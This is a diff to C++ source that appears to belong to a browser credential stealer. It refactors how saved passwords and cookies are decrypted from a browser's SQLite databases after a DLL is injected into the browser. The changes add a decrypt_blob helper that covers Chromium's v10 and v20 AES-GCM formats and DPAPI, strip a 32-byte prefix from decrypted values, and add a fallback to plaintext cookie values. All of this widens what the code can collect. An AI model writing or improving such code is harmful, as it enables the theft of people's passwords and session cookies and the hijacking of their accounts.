@@ -90,24 +90,50 @@ std::vector<unsigned char> base64_decode(std::string const& encoded_string) {
     return ret;
 }
 
-std::string to_utf8_lossy(const std::vector<unsigned char>& input) {
+std::string sanitize_internal(const unsigned char* data, size_t size) {
     std::string output;
-    output.reserve(input.size());
-    for (unsigned char c : input) {
-        if (c < 32 && c != '\r' && c != '\n' && c != '\t') output += ' ';
-        else output += (char)c;
+    output.reserve(size);
+    for (size_t i = 0; i < size; ++i) {
+        unsigned char c = data[i];
+        if ((c < 32 && c != '\r' && c != '\n' && c != '\t') || c == 127) {
+            output += ' ';
+        } else {
+            output += (char)c;
+        }
     }
     return output;
 }
 
+std::string to_utf8_lossy(const std::vector<unsigned char>& input) {
+    return sanitize_internal(input.data(), input.size());
+}
+
 std::string ensure_utf8(const std::string& input) {
-    std::string output;
-    output.reserve(input.size());
-    for (unsigned char c : input) {
-        if (c < 32 && c != '\r' && c != '\n' && c != '\t') output += ' ';
-        else output += (char)c;
+    return sanitize_internal((const unsigned char*)input.data(), input.size());
+}
+
+std::vector<unsigned char> strip_signature(const std::vector<unsigned char>& data) {
+    if (data.size() < 32) return data;
+    int non_printable = 0;
+    for (int i = 0; i < 32; i++) {
+        if (data[i] < 32 || data[i] > 126) non_printable++;
     }
-    return output;
+    if (non_printable > 16) return std::vector<unsigned char>(data.begin() + 32, data.end());
+    return data;
+}
+
+std::vector<unsigned char> decrypt_blob(const std::vector<unsigned char>& blob, const std::vector<unsigned char>& v10_key, const std::vector<unsigned char>& v20_key) {
+    if (blob.empty()) return {};
+    std::vector<unsigned char> dec;
+    if (blob.size() > 3 && std::string((char*)blob.data(), 3) == "v20") {
+        if (!v20_key.empty()) dec = aes_gcm_decrypt(v20_key, blob);
+    } else if (blob.size() > 3 && std::string((char*)blob.data(), 3) == "v10") {
+        if (!v10_key.empty()) dec = aes_gcm_decrypt(v10_key, blob);
+    } else {
+        dec = decrypt_dpapi(blob);
+    }
+    if (!dec.empty()) return strip_signature(dec);
+    return dec;
 }
 
 std::vector<unsigned char> decrypt_dpapi(const std::vector<unsigned char>& data) {
@@ -424,14 +450,9 @@ void inject_and_collect(const std::vector<unsigned char>& dll_bytes, const Brows
                             int pass_len = sqlite3_column_bytes(stmt, 2);
                             if (pass_blob && pass_len > 0) {
                                 std::vector<unsigned char> enc_pass(pass_blob, pass_blob + pass_len);
-                                bool is_v20 = (enc_pass.size() > 3 && std::string((char*)enc_pass.data(), 3) == "v20");
-                                auto& key = is_v20 ? v20_key : v10_key;
-                                if (!key.empty()) {
-                                    auto dec = aes_gcm_decrypt(key, enc_pass);
-                                    if (!dec.empty()) {
-                                        if (is_v20 && dec.size() > 32) dec.erase(dec.begin(), dec.begin() + 32);
-                                        p_data.passwords.push_back({ t_url ? t_url : "", t_user ? t_user : "", to_utf8_lossy(dec) });
-                                    }
+                                auto dec = decrypt_blob(enc_pass, v10_key, v20_key);
+                                if (!dec.empty()) {
+                                    p_data.passwords.push_back({ t_url ? t_url : "", t_user ? t_user : "", to_utf8_lossy(dec) });
                                 }
                             }
                         }
@@ -450,7 +471,7 @@ void inject_and_collect(const std::vector<unsigned char>& dll_bytes, const Brows
                 sqlite3* db;
                 if (open_db_readonly(wstring_to_utf8(tmp_db.wstring()), &db) == SQLITE_OK) {
                     sqlite3_stmt* stmt;
-                    if (sqlite3_prepare_v2(db, "SELECT host_key, name, path, expires_utc, is_secure, is_httponly, samesite, encrypted_value FROM cookies", -1, &stmt, nullptr) == SQLITE_OK) {
+                    if (sqlite3_prepare_v2(db, "SELECT host_key, name, path, expires_utc, is_secure, is_httponly, samesite, encrypted_value, value FROM cookies", -1, &stmt, nullptr) == SQLITE_OK) {
                         while (sqlite3_step(stmt) == SQLITE_ROW) {
                             const char* t_host = (const char*)sqlite3_column_text(stmt, 0);
                             const char* t_name = (const char*)sqlite3_column_text(stmt, 1);
@@ -461,17 +482,23 @@ void inject_and_collect(const std::vector<unsigned char>& dll_bytes, const Brows
                             int samesite = sqlite3_column_int(stmt, 6);
                             const unsigned char* enc_blob = (const unsigned char*)sqlite3_column_blob(stmt, 7);
                             int enc_len = sqlite3_column_bytes(stmt, 7);
+                            const char* t_val_plain = (const char*)sqlite3_column_text(stmt, 8);
+
+                            std::string final_value;
                             if (enc_blob && enc_len > 0) {
                                 std::vector<unsigned char> enc_val(enc_blob, enc_blob + enc_len);
-                                bool is_v20 = (enc_val.size() > 3 && std::string((char*)enc_val.data(), 3) == "v20");
-                                auto& key = is_v20 ? v20_key : v10_key;
-                                if (!key.empty()) {
-                                    auto dec = aes_gcm_decrypt(key, enc_val);
-                                    if (!dec.empty()) {
-                                        if (is_v20 && dec.size() > 32) dec.erase(dec.begin(), dec.begin() + 32);
-                                        p_data.cookies.push_back({ t_host ? t_host : "", t_name ? t_name : "", to_utf8_lossy(dec), t_path ? t_path : "", expires, secure, httponly, samesite });
-                                    }
+                                auto dec = decrypt_blob(enc_val, v10_key, v20_key);
+                                if (!dec.empty()) {
+                                    final_value = to_utf8_lossy(dec);
                                 }
+                            }
+
+                            if (final_value.empty() && t_val_plain && strlen(t_val_plain) > 0) {
+                                final_value = t_val_plain;
+                            }
+
+                            if (!final_value.empty()) {
+                                p_data.cookies.push_back({ t_host ? t_host : "", t_name ? t_name : "", final_value, t_path ? t_path : "", expires, secure, httponly, samesite });
                             }
                         }
                         sqlite3_finalize(stmt);
